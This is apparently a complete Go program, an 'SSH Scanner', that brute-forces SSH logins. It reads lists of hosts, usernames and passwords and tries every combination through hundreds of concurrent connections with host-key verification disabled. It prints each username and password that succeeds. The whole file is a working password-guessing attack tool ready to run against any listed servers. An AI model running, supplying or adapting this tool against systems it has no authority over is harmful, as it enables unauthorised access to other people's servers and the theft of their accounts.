package main

import (
	"bufio"
	"bytes"
	"fmt"
	"log"
	"os"
	"runtime"
	"strings"
	"time"

	"github.com/btcsuite/golangcrypto/ssh"
)

// HostInfo -
type HostInfo struct {
	host    string
	port    string
	user    string
	pass    string
	is_weak bool
}

// Usage - help function
func Usage(cmd string) {
	fmt.Println(strings.Repeat("-", 50))
	fmt.Println("SSH Scanner by hartnett <x@xsec.io>")
	fmt.Println("Usage:")
	fmt.Printf("%s iplist userdic passdic\n", cmd)
	fmt.Println(strings.Repeat("-", 50))
}

// Prepare - read lime from file and Scan
func Prepare(iplist, user_dict, pass_dict string) (slice_iplist, slice_user, slice_pass []string) {
	iplistFile, _ := os.Open(iplist)
	defer iplistFile.Close()
	scanner := bufio.NewScanner(iplistFile)
	scanner.Split(bufio.ScanLines)
	for scanner.Scan() {
		slice_iplist = append(slice_iplist, scanner.Text())
	}

	user_dictFile, _ := os.Open(user_dict)
	defer user_dictFile.Close()
	scanner_u := bufio.NewScanner(user_dictFile)
	scanner_u.Split(bufio.ScanLines)
	for scanner_u.Scan() {
		slice_user = append(slice_user, scanner_u.Text())
	}

	pass_dictFile, _ := os.Open(pass_dict)
	defer pass_dictFile.Close()
	scanner_p := bufio.NewScanner(pass_dictFile)
	scanner_p.Split(bufio.ScanLines)
	for scanner_p.Scan() {
		slice_pass = append(slice_pass, scanner_p.Text())
	}

	return slice_iplist, slice_user, slice_pass
}

// Scan - scan function
func Scan(slice_iplist, slice_user, slice_pass []string) {
	for _, host_port := range slice_iplist {
		fmt.Printf("Try to crack %s\n", host_port)
		t := strings.Split(host_port, ":")
		host := t[0]
		port := t[1]
		n := len(slice_user) * len(slice_pass)
		chan_scan_result := make(chan HostInfo, n)

		for _, user := range slice_user {
			for _, passwd := range slice_pass {

				host_info := HostInfo{}
				host_info.host = host
				host_info.port = port
				host_info.user = user
				host_info.pass = passwd
				host_info.is_weak = false

				go Crack(host_info, chan_scan_result)
				for runtime.NumGoroutine() > runtime.NumCPU()*300 {
					time.Sleep(10 * time.Microsecond)
				}
			}
		}
		done := make(chan bool, n)
		go func() {
			for i := 0; i < cap(chan_scan_result); i++ {
				select {
				case r := <-chan_scan_result:
					fmt.Println(r)
					if r.is_weak {
						var buf bytes.Buffer
						logger := log.New(&buf, "logger: ", log.Ldate)
						logger.Printf("%s:%s, user: %s, password: %s\n", r.host, r.port, r.user, r.pass)
						fmt.Print(&buf)
					}
				case <-time.After(1 * time.Second):
					// fmt.Println("timeout")
					break

				}
				done <- true

			}
		}()

		for i := 0; i < cap(done); i++ {
			// fmt.Println(<-done)
			<-done
		}

	}

}

// Crack - crack passwd
func Crack(host_info HostInfo, chan_scan_result chan HostInfo) {
	host := host_info.host
	port := host_info.port
	user := host_info.user
	passwd := host_info.pass
	is_ok := host_info.is_weak

	config := &ssh.ClientConfig{
		User: user,
		Auth: []ssh.AuthMethod{
			ssh.Password(passwd),
		},
		// really brute
		Timeout:         10 * time.Second,
		HostKeyCallback: ssh.InsecureIgnoreHostKey(),
	}
	client, err := ssh.Dial("tcp", host+":"+port, config)
	if err != nil {
		is_ok = false
		// panic("Failed to dial: " + err.Error())
	} else {
		session, err := client.NewSession()
		defer session.Close()

		if err != nil {
			is_ok = false
		} else {
			is_ok = true

		}

	}

	host_info.is_weak = is_ok
	chan_scan_result <- host_info
}

func main() {
	runtime.GOMAXPROCS(runtime.NumCPU())

	if len(os.Args) != 4 {
		Usage(os.Args[0])
	} else {
		Usage(os.Args[0])
		iplist := os.Args[1]
		user_dict := os.Args[2]
		pass_dict := os.Args[3]
		Scan(Prepare(iplist, user_dict, pass_dict))
	}
}
